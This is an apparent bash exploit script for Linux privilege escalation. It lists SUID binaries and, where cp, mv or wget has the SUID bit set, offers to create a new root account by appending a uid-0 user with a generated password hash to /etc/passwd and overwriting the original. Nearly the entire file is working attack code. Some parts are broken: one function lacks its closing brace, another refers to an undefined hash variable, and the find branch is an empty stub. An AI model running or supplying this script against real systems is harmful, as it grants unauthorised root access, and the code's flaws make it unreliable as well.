#!/usr/bin/env bash
cp_exploit()
{
	echo "Exploit started"
	read -p "User name : " user_name
	read -s -p "Password : "  password
	echo

	password_hash=$(openssl passwd -1 -salt ignite $password)

	if [ -e local_passwd ]
	then
		rm local_passwd
	fi

	cp /etc/passwd local_passwd
	more local_passwd > new_passwd

	echo "$user_name:$password_hash:0:0:root:/root:/bin/bash" >> new_passwd

	cp new_passwd /etc/passwd

	account_details $user_name

	close

mv_exploit()
{
	read -p "User name : " user_name
	read -s -p "Password : " password

	password_hash=$(openssl passwd -1 -salt ignite $password)

	if [ -e local_passwd ]
	then
		rm local_passwd
	fi

	cp /etc/passwd local_passwd
	more local_passwd > new_passwd

	echo "$user_name:$password_hash:0:0:root:/root:/bin/bash" >> new_passwd

	mv new_passwd /etc/passwd

	account_details

	close
}

find_exploit()
{
	return
}

echo_exploit()
{
	read -p "User name : " user_name
	read -s -p "Password : " password

	password_hash=$(openssl passwd -1 -salt ignite $password)

	if [ -e local_passwd ]
	then
		rm local_passwd
	fi

	cp /etc/passwd local_passwd
	more local_passwd > new_passwd

	#echo $password_hash

	echo "$user_name:$password_hash:0:0:root:/root:/bin/bash" >> /etc/passwd

	account_details

	close
}

wget_exploit()
{
	read -p "User name : " user_name
	read -s -p "Password : " password

	password_hash=$(openssl passwd -1 -salt ignite $password)

	if [ -e loacl_passwd ]
	then
		rm local_passwd
	fi

	cp /etc/passwd local_passwd
	more local_passwd > new_passwd

	echo "$user_name:$passwd_hash:0:0:root:/root:/bin/bash" >> new_passwd

	service apache2 start

	cp new_passwd /var/www/html/
	wget -O /etc/passwd http://localhost:80/new_passwd

	rm /var/www/html/new_passwd
	service apache2 stop
}

uname_info()
{
	for i in {1..50}; do echo -n "-"; done
	echo
	uname -a
	echo
	for i in {1..50}; do echo -n "-"; done
}

memory_info()
{
	for i in {1..50}; do echo -n "-"; done
	echo
	lsblk -l
	echo
	for i in {1..50}; do echo -n "-"; done
}

account_details()
{
	for i in {1..25}; do echo -n "-"; done
	echo
	echo "Root account created!"
	echo "User name : $1"
	for i in {1..25}; do echo -n "-"; done
	echo
}

close()
{
	echo "---------- Terminated ----------"
	exit 0
}



echo
memory_info
echo

echo
uname_info
echo

for f in `find / -perm -u=s -type f 2>/dev/null`
do
	if [ $f == "/usr/bin/cp" ]
	then
		echo "Vulnerable : $f"
		read -p "Can I create a new root account for you? [y/n] " choice

		if [ $choice == "y" ]
		then
			cp_exploit
		else
			echo
			close
		fi

	elif [ $f == "/usr/bin/mv" ]
	then
		echo "Vulnerable : $f"
		read -p "Can I create a new root account for you? [y/n] " choice

		if [ $choice == "y" ]
		then
			mv_exploit
		else
			close
		fi

	elif [ $f == "/usr/bin/find" ]
	then
		echo "Vulnerable : $f"
		read -p "Can I create a new root account for you? [y/n] " choice

		if [ $choice == "y" ]
		then
			find_exploit
		else
			close
		fi

	elif [ $f == "/usr/bin/wget" ]
	then
		echo "Vulenrable : $f"
		read -p "Can I create a new root account for you? [y/n] " choice

		if [ $choice == "y" ]
		then
			wget_exploit
		else
			close
		fi
	fi
done
